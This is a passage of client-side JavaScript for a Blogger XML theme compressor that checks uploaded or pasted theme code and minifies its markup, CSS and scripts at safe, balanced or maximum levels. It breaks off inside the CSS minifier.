
(function () {
  "use strict";

  var frbtcRoot = document.getElementById("frBtcTool");
  if (!frbtcRoot) return;

  function frbtcById(id) {
    return document.getElementById(id);
  }

  var frbtcEls = {
    uploadTab: frbtcById("frbtcUploadTab"),
    pasteTab: frbtcById("frbtcPasteTab"),
    uploadPanel: frbtcById("frbtcUploadPanel"),
    pastePanel: frbtcById("frbtcPastePanel"),
    fileInput: frbtcById("frbtcFileInput"),
    dropZone: frbtcById("frbtcDropZone"),
    fileInfo: frbtcById("frbtcFileInfo"),
    fileName: frbtcById("frbtcFileName"),
    fileMeta: frbtcById("frbtcFileMeta"),
    removeFile: frbtcById("frbtcRemoveFile"),
    codeInput: frbtcById("frbtcCodeInput"),
    codeCount: frbtcById("frbtcCodeCount"),
    pasteClipboard: frbtcById("frbtcPasteClipboard"),
    clearCode: frbtcById("frbtcClearCode"),
    sourceStatus: frbtcById("frbtcSourceStatus"),
    expertWarning: frbtcById("frbtcExpertWarning"),
    expertConfirm: frbtcById("frbtcExpertConfirm"),
    optComments: frbtcById("frbtcOptComments"),
    optCss: frbtcById("frbtcOptCss"),
    optJs: frbtcById("frbtcOptJs"),
    optInlineCss: frbtcById("frbtcOptInlineCss"),
    optInlineJs: frbtcById("frbtcOptInlineJs"),
    optLines: frbtcById("frbtcOptLines"),
    optSingle: frbtcById("frbtcOptSingle"),
    optPreserve: frbtcById("frbtcOptPreserve"),
    restoreDefaults: frbtcById("frbtcRestoreDefaults"),
    mainStatus: frbtcById("frbtcMainStatus"),
    compressButton: frbtcById("frbtcCompressButton"),
    progress: frbtcById("frbtcProgress"),
    progressBar: frbtcById("frbtcProgressBar"),
    progressList: frbtcById("frbtcProgressList"),
    results: frbtcById("frbtcResults"),
    resultMessage: frbtcById("frbtcResultMessage"),
    originalSize: frbtcById("frbtcOriginalSize"),
    compressedSize: frbtcById("frbtcCompressedSize"),
    savedSize: frbtcById("frbtcSavedSize"),
    percentSaved: frbtcById("frbtcPercentSaved"),
    resultNotice: frbtcById("frbtcResultNotice"),
    detailLevel: frbtcById("frbtcDetailLevel"),
    detailChars: frbtcById("frbtcDetailChars"),
    detailLines: frbtcById("frbtcDetailLines"),
    detailComments: frbtcById("frbtcDetailComments"),
    detailCss: frbtcById("frbtcDetailCss"),
    detailJs: frbtcById("frbtcDetailJs"),
    detailBlogger: frbtcById("frbtcDetailBlogger"),
    detailValidation: frbtcById("frbtcDetailValidation"),
    download: frbtcById("frbtcDownload"),
    copy: frbtcById("frbtcCopy"),
    view: frbtcById("frbtcView"),
    backup: frbtcById("frbtcBackup"),
    again: frbtcById("frbtcAgain"),
    another: frbtcById("frbtcAnother"),
    actionStatus: frbtcById("frbtcActionStatus"),
    viewer: frbtcById("frbtcViewer"),
    hideViewer: frbtcById("frbtcHideViewer"),
    viewerHide: frbtcById("frbtcViewerHide"),
    viewerCopy: frbtcById("frbtcViewerCopy"),
    fullscreen: frbtcById("frbtcFullscreen"),
    selectAll: frbtcById("frbtcSelectAll"),
    wrapCode: frbtcById("frbtcWrapCode"),
    codeView: frbtcById("frbtcCodeView")
  };

  var frbtcState = {
    sourceMode: "upload",
    original: "",
    compressed: "",
    originalFile: null,
    filename: "blogger-theme.xml",
    encoding: "UTF-8",
    verifyTimer: 0,
    busy: false,
    lastLevel: "balanced"
  };

  var frbtcDefaults = {
    safe: {
      comments: true,
      css: false,
      js: false,
      inlineCss: false,
      inlineJs: false,
      lines: true,
      single: false,
      preserve: false
    },
    balanced: {
      comments: true,
      css: true,
      js: true,
      inlineCss: true,
      inlineJs: false,
      lines: true,
      single: false,
      preserve: false
    },
    maximum: {
      comments: true,
      css: true,
      js: true,
      inlineCss: true,
      inlineJs: true,
      lines: true,
      single: true,
      preserve: false
    }
  };

  var frbtcLevelLabels = {
    safe: "Blogger Safe - Lowest Cleanup",
    balanced: "Balanced - Recommended",
    maximum: "Maximum - Expert Mode"
  };

  function frbtcSetStatus(element, message, type) {
    element.textContent = message;
    element.className = "frbtc-status" + (type ? " frbtc-" + type : "");
    element.hidden = !message;
  }

  function frbtcClearStatus(element) {
    element.textContent = "";
    element.className = "frbtc-status";
    element.hidden = true;
  }

  function frbtcGetLevel() {
    var chosen = frbtcRoot.querySelector('input[name="frbtcLevel"]:checked');
    return chosen ? chosen.value : "balanced";
  }

  function frbtcApplyDefaults(level) {
    var values = frbtcDefaults[level] || frbtcDefaults.balanced;
    frbtcEls.optComments.checked = values.comments;
    frbtcEls.optCss.checked = values.css;
    frbtcEls.optJs.checked = values.js;
    frbtcEls.optInlineCss.checked = values.inlineCss;
    frbtcEls.optInlineJs.checked = values.inlineJs;
    frbtcEls.optLines.checked = values.lines;
    frbtcEls.optSingle.checked = values.single;
    frbtcEls.optPreserve.checked = values.preserve;
    frbtcSyncCommentOptions();
  }

  function frbtcReadSettings() {
    return {
      removeComments: frbtcEls.optComments.checked && !frbtcEls.optPreserve.checked,
      minifyCss: frbtcEls.optCss.checked,
      minifyJs: frbtcEls.optJs.checked,
      inlineCss: frbtcEls.optInlineCss.checked,
      inlineJs: frbtcEls.optInlineJs.checked,
      removeLines: frbtcEls.optLines.checked,
      singleLine: frbtcEls.optSingle.checked,
      preserveAll: frbtcEls.optPreserve.checked
    };
  }

  function frbtcSyncCommentOptions() {
    if (frbtcEls.optPreserve.checked) {
      frbtcEls.optComments.checked = false;
      frbtcEls.optComments.disabled = true;
    } else {
      frbtcEls.optComments.disabled = false;
    }
  }

  function frbtcLevelChanged(event) {
    var level = event.target.value;
    frbtcState.lastLevel = level;
    frbtcRefreshLevelCards();
    frbtcApplyDefaults(level);
    frbtcEls.expertWarning.hidden = level !== "maximum";
    if (level !== "maximum") frbtcEls.expertConfirm.checked = false;
    frbtcClearStatus(frbtcEls.mainStatus);
  }

  function frbtcRefreshLevelCards() {
    var cards = frbtcRoot.querySelectorAll(".frbtc-level-card");
    for (var i = 0; i < cards.length; i += 1) {
      var input = cards[i].querySelector('input[type="radio"]');
      cards[i].classList.toggle("frbtc-selected", !!(input && input.checked));
    }
  }

  function frbtcSwitchSource(mode, force) {
    if (mode === frbtcState.sourceMode) return true;
    var hasSource = frbtcState.original.trim().length > 0;
    if (hasSource && !force) {
      var accepted = window.confirm("Switching input methods will clear the current theme. Continue?");
      if (!accepted) return false;
    }
    frbtcClearSourceOnly();
    frbtcState.sourceMode = mode;
    var uploadActive = mode === "upload";
    frbtcEls.uploadTab.classList.toggle("frbtc-active", uploadActive);
    frbtcEls.pasteTab.classList.toggle("frbtc-active", !uploadActive);
    frbtcEls.uploadTab.setAttribute("aria-selected", uploadActive ? "true" : "false");
    frbtcEls.pasteTab.setAttribute("aria-selected", uploadActive ? "false" : "true");
    frbtcEls.uploadTab.tabIndex = uploadActive ? 0 : -1;
    frbtcEls.pasteTab.tabIndex = uploadActive ? -1 : 0;
    frbtcEls.uploadPanel.hidden = !uploadActive;
    frbtcEls.pastePanel.hidden = uploadActive;
    if (!uploadActive) window.setTimeout(function () { frbtcEls.codeInput.focus(); }, 0);
    return true;
  }

  function frbtcClearSourceOnly() {
    window.clearTimeout(frbtcState.verifyTimer);
    frbtcState.original = "";
    frbtcState.compressed = "";
    frbtcState.originalFile = null;
    frbtcState.filename = "blogger-theme.xml";
    frbtcState.encoding = "UTF-8";
    frbtcEls.fileInput.value = "";
    frbtcEls.codeInput.value = "";
    frbtcEls.fileInfo.hidden = true;
    frbtcEls.dropZone.hidden = false;
    frbtcUpdateCodeCount();
    frbtcClearStatus(frbtcEls.sourceStatus);
    frbtcClearStatus(frbtcEls.mainStatus);
    frbtcHideResults();
  }

  function frbtcUpdateCodeCount() {
    var text = frbtcEls.codeInput.value || "";
    frbtcEls.codeCount.textContent = frbtcFormatNumber(text.length) + " characters | " + frbtcFormatBytes(frbtcByteLength(text));
  }

  function frbtcByteLength(text) {
    try {
      return new Blob([text]).size;
    } catch (error) {
      return unescape(encodeURIComponent(text)).length;
    }
  }

  function frbtcFormatBytes(bytes) {
    if (!isFinite(bytes) || bytes < 0) return "0 B";
    if (bytes < 1024) return bytes + " B";
    var units = ["KB", "MB", "GB"];
    var value = bytes;
    var unit = "B";
    for (var i = 0; i < units.length && value >= 1024; i += 1) {
      value /= 1024;
      unit = units[i];
    }
    return value.toFixed(value >= 100 ? 1 : 2) + " " + unit;
  }

  function frbtcFormatSignedBytes(bytes) {
    if (bytes >= 0) return frbtcFormatBytes(bytes);
    return "-" + frbtcFormatBytes(Math.abs(bytes));
  }

  function frbtcFormatNumber(value) {
    try {
      return Number(value).toLocaleString();
    } catch (error) {
      return String(value);
    }
  }

  function frbtcDetectEncoding(text) {
    var sample = text.slice(0, 250);
    var match = sample.match(/<\?xml[^>]*encoding\s*=\s*(["'])([^"']+)\1/i);
    if (match) return match[2].toUpperCase();
    if (text.charCodeAt(0) === 0xFEFF) return "UTF-8 BOM";
    return "UTF-8";
  }

  async function frbtcHandleFile(file) {
    frbtcClearStatus(frbtcEls.mainStatus);
    if (!file) return;
    if (!/\.xml$/i.test(file.name || "")) {
      frbtcSetStatus(frbtcEls.sourceStatus, "Please choose a Blogger theme file ending in .xml.", "error");
      frbtcEls.fileInput.value = "";
      return;
    }
    if (!file.size) {
      frbtcSetStatus(frbtcEls.sourceStatus, "The selected XML file is empty.", "error");
      return;
    }
    if (file.size > 30 * 1024 * 1024) {
      frbtcSetStatus(frbtcEls.sourceStatus, "This theme is larger than 30 MB and may exceed browser memory. Please use a smaller Blogger XML file.", "error");
      return;
    }
    try {
      frbtcSetStatus(frbtcEls.sourceStatus, "Reading and checking the selected theme...", "info");
      var text = await file.text();
      frbtcState.original = text;
      frbtcState.originalFile = file;
      frbtcState.filename = file.name;
      frbtcState.encoding = frbtcDetectEncoding(text);
      frbtcEls.fileName.textContent = file.name;
      frbtcEls.fileMeta.textContent = frbtcFormatBytes(file.size) + " | " + frbtcState.encoding;
      frbtcEls.dropZone.hidden = true;
      frbtcEls.fileInfo.hidden = false;
      frbtcHideResults();
      frbtcShowVerification(frbtcVerifySource(frbtcState.original));
    } catch (error) {
      frbtcSetStatus(frbtcEls.sourceStatus, "The XML file could not be read. Please choose the file again.", "error");
    }
  }

  function frbtcHandlePasteInput() {
    frbtcState.original = frbtcEls.codeInput.value;
    frbtcState.filename = "blogger-theme.xml";
    frbtcState.originalFile = null;
    frbtcState.encoding = frbtcDetectEncoding(frbtcState.original);
    frbtcState.compressed = "";
    frbtcUpdateCodeCount();
    frbtcHideResults();
    window.clearTimeout(frbtcState.verifyTimer);
    if (!frbtcState.original.trim()) {
      frbtcClearStatus(frbtcEls.sourceStatus);
      return;
    }
    frbtcSetStatus(frbtcEls.sourceStatus, "Theme code entered. Verification will run automatically.", "info");
    frbtcState.verifyTimer = window.setTimeout(function () {
      frbtcShowVerification(frbtcVerifySource(frbtcState.original));
    }, 650);
  }

  function frbtcShowVerification(result) {
    if (result.valid) {
      var details = "Blogger theme verified successfully. " +
        frbtcFormatNumber(result.structure.widgets) + " widgets and " +
        frbtcFormatNumber(result.structure.sections) + " sections detected.";
      frbtcSetStatus(frbtcEls.sourceStatus, details, "success");
    } else {
      frbtcSetStatus(frbtcEls.sourceStatus, result.message, "error");
    }
  }

  function frbtcVerifySource(text) {
    var value = String(text || "").replace(/^\uFEFF/, "");
    if (!value.trim()) return { valid: false, message: "Add a Blogger XML theme before compressing." };
    if (value.length < 100) return { valid: false, message: "The supplied code is too short to be a complete Blogger theme." };
    var xmlResult = frbtcValidateXml(value);
    if (!xmlResult.valid) {
      return { valid: false, message: "Invalid XML" + frbtcLocationText(xmlResult) + ". " + xmlResult.detail };
    }
    var rootName = xmlResult.document.documentElement ? String(xmlResult.document.documentElement.localName || xmlResult.document.documentElement.nodeName).toLowerCase() : "";
    var structure = frbtcCollectStructure(value);
    var missing = [];
    if (rootName !== "html") missing.push("html root");
    if (!structure.hasHead) missing.push("head");
    if (!structure.hasBody) missing.push("body");
    if (!structure.hasBloggerNamespace) missing.push("Blogger namespace");
    if (!structure.skins) missing.push("b:skin");
    if (!structure.bloggerTags) missing.push("Blogger elements");
    if (!structure.widgets && !structure.sections) missing.push("Blogger widget or section");
    if (missing.length) {
      return {
        valid: false,
        message: "This appears to be XML, but required Blogger theme elements were not found: " + missing.join(", ") + "."
      };
    }
    return { valid: true, document: xmlResult.document, structure: structure };
  }

  function frbtcValidateXml(text) {
    try {
      var parser = new DOMParser();
      var doc = parser.parseFromString(text, "application/xml");
      var errorNode = doc.getElementsByTagName("parsererror")[0];
      if (!errorNode && doc.documentElement && String(doc.documentElement.localName).toLowerCase() === "parsererror") errorNode = doc.documentElement;
      if (errorNode) {
        var detail = (errorNode.textContent || "XML structure could not be parsed.").replace(/\s+/g, " ").trim();
        var lineMatch = detail.match(/(?:line|Line Number)\s*[: ]\s*(\d+)/i);
        var columnMatch = detail.match(/(?:column|Column)\s*[: ]\s*(\d+)/i);
        return {
          valid: false,
          line: lineMatch ? Number(lineMatch[1]) : 0,
          column: columnMatch ? Number(columnMatch[1]) : 0,
          detail: detail.slice(0, 260)
        };
      }
      return { valid: true, document: doc };
    } catch (error) {
      return { valid: false, line: 0, column: 0, detail: "XML structure could not be parsed." };
    }
  }

  function frbtcLocationText(result) {
    if (result.line && result.column) return " near line " + result.line + ", column " + result.column;
    if (result.line) return " near line " + result.line;
    return "";
  }

  function frbtcCollectStructure(text) {
    var tokens = frbtcTokenizeMarkup(text);
    var ids = [];
    var namespaces = [];
    var structure = {
      widgets: 0,
      sections: 0,
      skins: 0,
      bloggerTags: 0,
      dataExpressions: 0,
      scripts: 0,
      styles: 0,
      cdata: 0,
      hasHead: false,
      hasBody: false,
      hasBloggerNamespace: false,
      ids: ids,
      namespaces: namespaces
    };
    for (var i = 0; i < tokens.length; i += 1) {
      var token = tokens[i];
      if (token.type === "special" && token.value.slice(0, 9) === "<![CDATA[") {
        structure.cdata += 1;
        continue;
      }
      if (token.type !== "tag" || /^<\s*\//.test(token.value) || /^<\s*[!?]/.test(token.value)) continue;
      var name = frbtcTagName(token.value);
      if (!name) continue;
      if (name === "head") structure.hasHead = true;
      if (name === "body") structure.hasBody = true;
      if (name === "script") structure.scripts += 1;
      if (name === "style") structure.styles += 1;
      if (name === "b:skin") structure.skins += 1;
      if (name === "b:widget") structure.widgets += 1;
      if (name === "b:section") structure.sections += 1;
      if (name.indexOf("b:") === 0) structure.bloggerTags += 1;
      var dataMatches = token.value.match(/\bdata:[A-Za-z_][\w.-]*/g);
      if (dataMatches) structure.dataExpressions += dataMatches.length;
      if (name === "b:widget" || name === "b:section") {
        var idMatch = token.value.match(/\sid\s*=\s*(["'])(.*?)\1/i);
        if (idMatch) ids.push(idMatch[2]);
      }
      var nsPattern = /\b(xmlns(?::[A-Za-z_][\w.-]*)?)\s*=\s*(["'])(.*?)\2/gi;
      var nsMatch;
      while ((nsMatch = nsPattern.exec(token.value))) {
        var entry = nsMatch[1].toLowerCase() + "=" + nsMatch[3];
        namespaces.push(entry);
        if (entry === "xmlns:b=http://www.google.com/2005/gml/b") structure.hasBloggerNamespace = true;
      }
    }
    ids.sort();
    namespaces.sort();
    return structure;
  }

  function frbtcCompareStructure(before, after) {
    var fields = ["widgets", "sections", "skins", "bloggerTags", "dataExpressions", "scripts", "styles", "cdata"];
    var differences = [];
    for (var i = 0; i < fields.length; i += 1) {
      var field = fields[i];
      if (before[field] !== after[field]) differences.push(field);
    }
    if (before.ids.join("\n") !== after.ids.join("\n")) differences.push("Blogger IDs");
    if (before.namespaces.join("\n") !== after.namespaces.join("\n")) differences.push("XML namespaces");
    if (before.hasHead !== after.hasHead || before.hasBody !== after.hasBody) differences.push("theme elements");
    return { valid: differences.length === 0, differences: differences };
  }

  function frbtcMakeContext(settings, level) {
    return {
      settings: settings,
      level: level,
      seed: "FRBTCX" + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 9).toUpperCase() + "X",
      blocks: [],
      metrics: {
        commentsRemoved: 0,
        cssBlocks: 0,
        jsBlocks: 0,
        inlineCss: 0,
        inlineJs: 0,
        jsSkippedTemplates: 0,
        whitespaceRisks: 0,
        protectedBlocks: 0
      }
    };
  }

  function frbtcStoreBlock(context, content) {
    var token = context.seed + context.blocks.length + "X";
    context.blocks.push({ token: token, content: content });
    context.metrics.protectedBlocks += 1;
    return token;
  }

  function frbtcRestoreBlocks(text, context) {
    var output = text;
    for (var i = context.blocks.length - 1; i >= 0; i -= 1) {
      var block = context.blocks[i];
      output = output.split(block.token).join(block.content);
    }
    return output;
  }

  function frbtcFindElementTag(text, tagName, from, closing) {
    var lower = text.toLowerCase();
    var needle = "<" + (closing ? "/" : "") + tagName.toLowerCase();
    var position = Math.max(0, from || 0);
    while (position < text.length) {
      var start = text.indexOf("<", position);
      if (start < 0) return null;
      if (text.slice(start, start + 4) === "<!--") {
        var commentEnd = text.indexOf("-->", start + 4);
        position = commentEnd < 0 ? text.length : commentEnd + 3;
        continue;
      }
      if (text.slice(start, start + 9) === "<![CDATA[") {
        var cdataEnd = text.indexOf("]]>", start + 9);
        position = cdataEnd < 0 ? text.length : cdataEnd + 3;
        continue;
      }
      if (lower.slice(start, start + needle.length) === needle) {
        var boundary = text.charAt(start + needle.length);
        if (!boundary || /[\s/>]/.test(boundary)) {
          var targetEnd = frbtcFindTagEnd(text, start);
          if (targetEnd < 0) return null;
          return { start: start, end: targetEnd };
        }
      }
      var tagEnd = frbtcFindTagEnd(text, start);
      position = tagEnd < 0 ? start + 1 : tagEnd + 1;
    }
    return null;
  }

  function frbtcReplaceElementBlocks(text, tagName, callback) {
    var output = "";
    var cursor = 0;
    var searchFrom = 0;
    while (searchFrom < text.length) {
      var opening = frbtcFindElementTag(text, tagName, searchFrom, false);
      if (!opening) break;
      var openingText = text.slice(opening.start, opening.end + 1);
      if (/\/\s*>$/.test(openingText)) {
        searchFrom = opening.end + 1;
        continue;
      }
      var closing = frbtcFindElementTag(text, tagName, opening.end + 1, true);
      if (!closing) break;
      output += text.slice(cursor, opening.start);
      output += callback(text.slice(opening.start, closing.end + 1));
      cursor = closing.end + 1;
      searchFrom = cursor;
    }
    return output + text.slice(cursor);
  }

  function frbtcProtectRawElements(text, context) {
    text = frbtcReplaceElementBlocks(text, "pre", function (match) { return frbtcStoreBlock(context, match); });
    text = frbtcReplaceElementBlocks(text, "textarea", function (match) { return frbtcStoreBlock(context, match); });
    return text;
  }

  function frbtcProcessStyleBlocks(text, context) {
    text = frbtcReplaceElementBlocks(text, "b:skin", function (match) {
      var transformed = context.settings.minifyCss ? frbtcTransformBlockBody(match, function (body) {
        return frbtcMinifyWrappedCss(body, context);
      }, context) : match;
      if (transformed !== match) context.metrics.cssBlocks += 1;
      return frbtcStoreBlock(context, transformed);
    });
    text = frbtcReplaceElementBlocks(text, "style", function (match) {
      var transformed = context.settings.minifyCss ? frbtcTransformBlockBody(match, function (body) {
        return frbtcMinifyWrappedCss(body, context);
      }, context) : match;
      if (transformed !== match) context.metrics.cssBlocks += 1;
      return frbtcStoreBlock(context, transformed);
    });
    return text;
  }

  function frbtcProcessScriptBlocks(text, context) {
    return frbtcReplaceElementBlocks(text, "script", function (match) {
      var openEnd = frbtcFindTagEnd(match, 0);
      if (openEnd < 0) return frbtcStoreBlock(context, match);
      var openTag = match.slice(0, openEnd + 1);
      var typeMatch = openTag.match(/\btype\s*=\s*(["'])(.*?)\1/i);
      var type = typeMatch ? typeMatch[2].trim().toLowerCase() : "";
      var isJavaScript = !type || type === "text/javascript" || type === "application/javascript" || type === "module" || type === "text/ecmascript" || type === "application/ecmascript";
      if (!isJavaScript || !context.settings.minifyJs) return frbtcStoreBlock(context, match);
      var transformed = frbtcTransformBlockBody(match, function (body) {
        return frbtcMinifyWrappedJs(body, context, false);
      }, context);
      if (transformed !== match) context.metrics.jsBlocks += 1;
      return frbtcStoreBlock(context, transformed);
    });
  }

  function frbtcTransformBlockBody(match, transformer, context) {
    var openEnd = frbtcFindTagEnd(match, 0);
    var closeStart = match.lastIndexOf("<");
    if (openEnd < 0 || closeStart <= openEnd) return match;
    var openTag = frbtcMinifyTag(match.slice(0, openEnd + 1), context);
    var body = match.slice(openEnd + 1, closeStart);
    var closeTag = frbtcMinifyTag(match.slice(closeStart), context);
    return openTag + transformer(body) + closeTag;
  }

  function frbtcMinifyWrappedCss(body, context) {
    var start = body.indexOf("<![CDATA[");
    var end = body.lastIndexOf("]]>");
    if (start >= 0 && end > start) {
      var prefixText = body.slice(0, start);
      var before = body.slice(0, start + 9);
      var inner = body.slice(start + 9, end);
      var after = body.slice(end);
      if (/\/\*\s*$/.test(prefixText) || /^\s*\*\//.test(inner)) return body;
      return before + frbtcPreserveCdataEdges(inner, frbtcMinifyCss(inner, context)) + after;
    }
    return frbtcMinifyCss(body, context);
  }

  function frbtcMinifyWrappedJs(body, context, inline) {
    var start = body.indexOf("<![CDATA[");
    var end = body.lastIndexOf("]]>");
    if (start >= 0 && end > start) {
      var prefixText = body.slice(0, start);
      var before = body.slice(0, start + 9);
      var inner = body.slice(start + 9, end);
      var after = body.slice(end);
      if (/\/\*\s*$/.test(prefixText) || /^\s*\*\//.test(inner)) return body;
      var lineCommentWrapper = /\/\/\s*$/.test(prefixText);
      var closingLine = lineCommentWrapper ? inner.match(/(?:\r\n|\r|\n)[ \t]*\/\/[ \t]*$/) : null;
      var workingInner = closingLine ? inner.slice(0, inner.length - closingLine[0].length) : inner;
      var compressedInner = frbtcPreserveCdataEdges(workingInner, frbtcMinifyJs(workingInner, context, inline));
      if (lineCommentWrapper && compressedInner.charAt(0) !== "\n") compressedInner = "\n" + compressedInner;
      if (closingLine) compressedInner += "\n//";
      return before + compressedInner + after;
    }
    return frbtcMinifyJs(body, context, inline);
  }

  function frbtcPreserveCdataEdges(original, compressed) {
    if (!compressed) return compressed;
    var leading = /^[ \t]*(?:\r\n|\r|\n)/.test(original) ? "\n" : "";
    var trailing = /(?:\r\n|\r|\n)[ \t]*$/.test(original) ? "\n" : "";
    return leading + compressed + trailing;
  }

  function frbtcProtectRemainingCdata(text, context) {
    return text.replace(/<!\[CDATA\[[\s\S]*?\]\]>/g, function (match) {
      return frbtcStoreBlock(context, match);
    });
  }

  function frbtcCompressTheme(source, level, settings) {
    var context = frbtcMakeContext(settings, level);
    var working = String(source).replace(/^\uFEFF/, "");
    working = frbtcProtectRawElements(working, context);
    working = frbtcProcessStyleBlocks(working, context);
    working = frbtcProcessScriptBlocks(working, context);
    working = frbtcProtectRemainingCdata(working, context);
    working = frbtcMinifyMarkup(working, context);
    if (settings.singleLine) working = working.replace(/[\r\n]+/g, "");
    working = frbtcRestoreBlocks(working, context);
    return { code: working.trim(), context: context };
  }

  function frbtcTokenizeMarkup(text) {
    var tokens = [];
    var i = 0;
    while (i < text.length) {
      if (text.slice(i, i + 4) === "<!--") {
        var commentEnd = text.indexOf("-->", i + 4);
        if (commentEnd < 0) commentEnd = text.length - 3;
        tokens.push({ type: "comment", value: text.slice(i, commentEnd + 3) });
        i = commentEnd + 3;
      } else if (text.slice(i, i + 9) === "<![CDATA[") {
        var cdataEnd = text.indexOf("]]>", i + 9);
        if (cdataEnd < 0) cdataEnd = text.length - 3;
        tokens.push({ type: "special", value: text.slice(i, cdataEnd + 3) });
        i = cdataEnd + 3;
      } else if (text.charAt(i) === "<") {
        var tagEnd = frbtcFindTagEnd(text, i);
        if (tagEnd < 0) {
          tokens.push({ type: "text", value: text.slice(i) });
          break;
        }
        tokens.push({ type: "tag", value: text.slice(i, tagEnd + 1) });
        i = tagEnd + 1;
      } else {
        var next = text.indexOf("<", i);
        if (next < 0) next = text.length;
        tokens.push({ type: "text", value: text.slice(i, next) });
        i = next;
      }
    }
    return tokens;
  }

  function frbtcFindTagEnd(text, start) {
    var quote = "";
    var bracketDepth = 0;
    for (var i = start + 1; i < text.length; i += 1) {
      var char = text.charAt(i);
      if (quote) {
        if (char === quote) quote = "";
        continue;
      }
      if (char === "\"" || char === "'") {
        quote = char;
      } else if (char === "[" && text.slice(start, start + 9).toUpperCase().indexOf("<!DOCTYPE") === 0) {
        bracketDepth += 1;
      } else if (char === "]" && bracketDepth > 0) {
        bracketDepth -= 1;
      } else if (char === ">" && bracketDepth === 0) {
        return i;
      }
    }
    return -1;
  }

  function frbtcTagName(tag) {
    var match = tag.match(/^<\/?\s*([A-Za-z_][\w:.-]*)/);
    return match ? match[1].toLowerCase() : "";
  }

  function frbtcNearestTag(tokens, index, direction) {
    for (var i = index + direction; i >= 0 && i < tokens.length; i += direction) {
      if (tokens[i].type === "tag") return tokens[i].value;
      if (tokens[i].type === "text" && tokens[i].value.trim()) return "";
    }
    return "";
  }

  function frbtcMinifyMarkup(text, context) {
    var tokens = frbtcTokenizeMarkup(text);
    var output = [];
    var blockNames = {
      html: 1, head: 1, body: 1, div: 1, section: 1, article: 1, aside: 1, header: 1, footer: 1, main: 1,
      p: 1, h1: 1, h2: 1, h3: 1, h4: 1, h5: 1, h6: 1, ul: 1, ol: 1, li: 1, table: 1, thead: 1,
      tbody: 1, tfoot: 1, tr: 1, form: 1, fieldset: 1, nav: 1, "b:if": 1, "b:loop": 1, "b:section": 1,
      "b:widget": 1, "b:includable": 1, "b:include": 1, "b:else": 1, "b:switch": 1, "b:case": 1, "b:default": 1
    };
    for (var i = 0; i < tokens.length; i += 1) {
      var token = tokens[i];
      if (token.type === "comment") {
        var important = /<!--\s*\[if/i.test(token.value) || /<!--\s*!/i.test(token.value) || /@preserve|@license/i.test(token.value);
        if (context.settings.removeComments && !context.settings.preserveAll && !important) {
          context.metrics.commentsRemoved += 1;
          continue;
        }
        output.push(token.value);
      } else if (token.type === "tag") {
        output.push(frbtcMinifyTag(token.value, context));
      } else if (token.type === "special") {
        output.push(token.value);
      } else {
        var value = token.value;
        if (!value) continue;
        if (/^\s+$/.test(value)) {
          var previousTag = frbtcNearestTag(tokens, i, -1);
          var nextTag = frbtcNearestTag(tokens, i, 1);
          var previousName = frbtcTagName(previousTag);
          var nextName = frbtcTagName(nextTag);
          if (context.level === "maximum") {
            if (previousTag && nextTag && (!blockNames[previousName] || !blockNames[nextName])) context.metrics.whitespaceRisks += 1;
          } else if (previousTag && nextTag) {
            if (output[output.length - 1] !== " ") output.push(" ");
          }
        } else if (context.level === "maximum") {
          output.push(value.replace(/\s+/g, " "));
        } else if (context.settings.removeLines) {
          output.push(value.replace(/[ \t]*[\r\n]+[ \t]*/g, " "));
        } else {
          output.push(value);
        }
      }
    }
    return output.join("");
  }

  function frbtcMinifyTag(tag, context) {
    if (/^<!|^<\?/i.test(tag)) return tag;
    var output = "";
    var quote = "";
    var pendingSpace = false;
    for (var i = 0; i < tag.length; i += 1) {
      var char = tag.charAt(i);
      if (quote) {
        output += char;
        if (char === quote) quote = "";
        continue;
      }
      if (char === "\"" || char === "'") {
        if (pendingSpace && output && output.charAt(output.length - 1) !== "<") output += " ";
        pendingSpace = false;
        quote = char;
        output += char;
      } else if (/\s/.test(char)) {
        pendingSpace = true;
      } else {
        if (pendingSpace && output && output.charAt(output.length - 1) !== "<" && char !== ">" && !(char === "/" && tag.charAt(i + 1) === ">")) output += " ";
        pendingSpace = false;
        output += char;
      }
    }
    if (context && context.settings.inlineCss && /^<[^!?/]/.test(output)) {
      output = output.replace(/(\sstyle\s*=\s*)(["'])([\s\S]*?)\2/gi, function (all, prefix, q, value) {
        var changed = frbtcMinifyCss(value, context);
        if (changed !== value) context.metrics.inlineCss += 1;
        return prefix + q + changed + q;
      });
    }
    if (context && context.settings.inlineJs && /^<[^!?/]/.test(output)) {
      output = output.replace(/(\son[a-z]+\s*=\s*)(["'])([\s\S]*?)\2/gi, function (all, prefix, q, value) {
        var changed = frbtcMinifyJs(value, context, true);
        if (changed !== value) context.metrics.inlineJs += 1;
        return prefix + q + changed + q;
      });
    }
    return output;
  }

  function frbtcReadQuoted(text, start) {
    var quote = text.charAt(start);
    var i = start + 1;
    while (i < text.length) {
      var char = text.charAt(i);
      if (char === "\\") {
        i += 2;
        continue;
      }
      if (char === quote) return i + 1;
      i += 1;
    }
    return text.length;
  }

  function frbtcMinifyCss(source, context) {
    var output = "";
    var i = 0;
    var pendingSpace = false;
    while (i < source.length) {
      var char = source.charAt(i);
      var next = source.charAt(i + 1);
      if (char === "\"" || char === "'") {
        if (pendingSpace && frbtcCssNeedsSpace(output.charAt(output.length - 1), char)) output += " ";
        pendingSpace = false;
        var stringEnd = frbtcReadQuoted(source, i);
        output += source.slice(i, stringEnd);
        i = stringEnd;
        continue;
      }
      var functionMatch = source.slice(i).match(/^(url|calc|min|max|clamp|var|env)\s*\(/i);
      if (functionMatch) {
        var openIndex = i + functionMatch[0].lastIndexOf("(");
        var functionEnd = frbtcReadCssFunctionEnd(source, openIndex);
        if (pendingSpace && frbtcCssNeedsSpace(output.charAt(output.length - 1), char)) output += " ";
        pendingSpace = false;
        output += source.slice(i, functionEnd);
        i = functionEnd;
        continue;
      }
      if (char === "/" && next === "*") {
        var commentEnd = source.indexOf("*/", i + 2);
        if (commentEnd < 0) commentEnd = source.length - 2;
        var comment = source.slice(i, commentEnd + 2);
        var keep = context.settings.preserveAll || /^\/\*!/.test(comment) || /<\s*(?:Variable|Group)\b/i.test(comment) || /@preserve|@license/i.test(comment);
        if (keep) {
          if (pendingSpace && output) output += " ";
          output += comment;
          pendingSpace = true;
        } else {
          context.metrics.commentsRemoved += 1;
          var afterComment = commentEnd + 2;
          while (afterComment < source.length && /\s/.test(source.charAt(afterComment))) afterComment += 1;
          var leftChar = output.charAt(output.length - 1);
          var rightChar = source.charAt(afterComment);
          if (/[A-Za-z0-9_%$-]/.test(leftChar) && /[A-Za-z0-9_$-]/.test(rightChar)) pendingSpace = true;
        }
        i = commentEnd + 2;
        continue;
      }
      if (/\s/.test(char)) {
